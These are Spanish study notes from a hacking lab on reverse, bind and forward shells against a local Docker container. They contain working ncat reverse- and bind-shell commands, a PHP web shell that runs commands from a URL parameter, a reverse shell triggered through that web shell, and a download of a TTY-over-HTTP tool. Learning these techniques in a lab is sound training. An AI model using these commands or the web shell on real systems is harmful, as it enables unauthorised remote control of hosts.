
---------
- Tags: #ReverseShells #BindShells #ForwardShells
---------------
> **Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.

- Creamos un archivo
```bin/bash
nvim dockerfile
```
- Desplegamos la maquina
```bin/bash
docker build -t webserver .
```
- En segundo plano con una consola virtual y de manera interactiva
```bin/bash
docker run -dit -p 80:80 --name myContainer my_image
```
- Conseguir una consola interactiva e instalamos ncat
```bin/bash
docker exec -it myContainer bash
apt install ncat
```
- Con la herramienta netcat ponernos en escucha
```bin/bash
nc -nlvp 443
```
- Desde la maquina interactiva en bash ponemos para recibir conexión
```bin/bash
ncat -e /bin/bash 172.17.0.1 443
```
- Para ver mejor el diseño en pantalla
```bin/bash
script /dev/null -c bash
```

![[Ejemplo de Reverse Shells.png]]


>**Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

- Con ncat iniciado la maquina interactica con:
```bin/bash
docker exec -it myContainer bash
apt install ncat
```
- Escuchar por el puerto 443 ofreciendo una bash
```bin/bash
ncat -nlvp 443 -e /bin/bash
```


![[Ejemplo de BindShells.png]]

>**Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

- Escuchar por el puerto 443 ofreciendo una bash
```bin/bash
ncat -nlvp 443 -e /bin/bash
```
- En otra terminal ingresamos el comando
```bin/bash
nc 172.17.0.2 443
```
- También podemos realizar los siguientes pasos 
```bin/bash
docker rm $(docker ps -a -q) --force
```
- Este comando nos permite instalar iptables en la consola interactiva
```bin/bash
docker run -dit -p 80:80 --cap-add=NET_ADMIN --name myContainer webserver
```
- Corremos el contenedor
```
docker exec -it myContainer bash
```
- En el bash instalamos iptables
```
install iptables
iptables --flush
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 0:65535 -m conntrack --ctstate NEW -j DROP
```
- Nos dirigimos al archivo 
```
/var/www/html/
```
- Instalamos nano
```bin/bash
apt install nano
```
- Creamos un archivo en la interfaz dinamica
```
nano cmd.php
```
```php
<?
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```
- Abrimos este archivo para reparar el problema php en la pagina
```
nano /etc/php/8.1/apache2/php.ini
```
-----

(Ctrl+w) = nos permite filtrar la linea `short_open_tag`
Cambiar el Off por el On
Cerramos y actualizamos la pagina web localhosts
Y listo tenemos ejecución por consola a través de `localhost/cmd.php?cmd=whoami` a través de la URL

-------
- Instalamos ncat
```
apt install ncat
```
- Nos ponemos en escucha en el puerto 443
```
nc -nlvp 443
```
- Nos conectamos desde la **URL**
```
localhost/cmd.php?cmd=ncat -e /bin/bash 172.17.0.1 443
```
- Si no funciona podemos intentar trabajar con la libreria `ttyoverhttp.py` copiando el raw 
```
wget https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py
```
Modificamos todos los index.php a cmd.php
- Actualizamos el archivo cmd.php 
```php
<?php
	echo shell_exec($_GET['cmd']);
?>
```
- Nos conectamos a la escucha de nuevo por 
```
nc -nlvp 443
```
- O tambien nos podemos conectar por 
```python
python tty_over_http.py
```
- Para conseguir una consola interactiva
```
script /dev/null -c bash
```

![[Ejemplo de ForwardShells.png]]